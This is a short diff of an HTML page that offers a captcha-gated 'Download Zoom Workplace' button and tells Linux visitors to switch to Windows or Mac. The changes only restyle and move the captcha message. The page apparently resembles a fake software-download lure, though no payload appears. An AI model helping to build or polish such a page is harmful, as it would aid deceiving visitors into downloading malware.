@@ -54,13 +54,15 @@
 			<p id="hidden-text-linux" style="display: none; margin-top: 0rem;" ;>In order to join a meeting please switch to
 				your desktop/laptop computer running Windows or Mac OS.</p>
 
-			<p id="captcha-text" style="display:none; color: red">Please complete the captcha below.</p>
 
 			<form id="protected-form" method="POST" action="/verify-captcha">
 				<!-- Your protected button -->
-				<button type="submit" id="meeting-btn" class="main__button" style="margin-bottom: 2rem" ;>Download Zoom
+				<button type="submit" id="meeting-btn" class="main__button" style="margin-bottom: 0.75rem" ;>Download Zoom
 					Workplace</button>
 
+				<p id="captcha-text" style="display:hidden; color: red; font-weight: 400; font-size: 0.85rem;">Please complete
+					the
+					captcha below.</p>
 				<!-- Turnstile widget -->
 				<div class="cf-turnstile" data-sitekey="0x4AAAAAABlr6UMDZ-YEyGah" data-callback="onTurnstileSuccess"
 					data-theme="light">
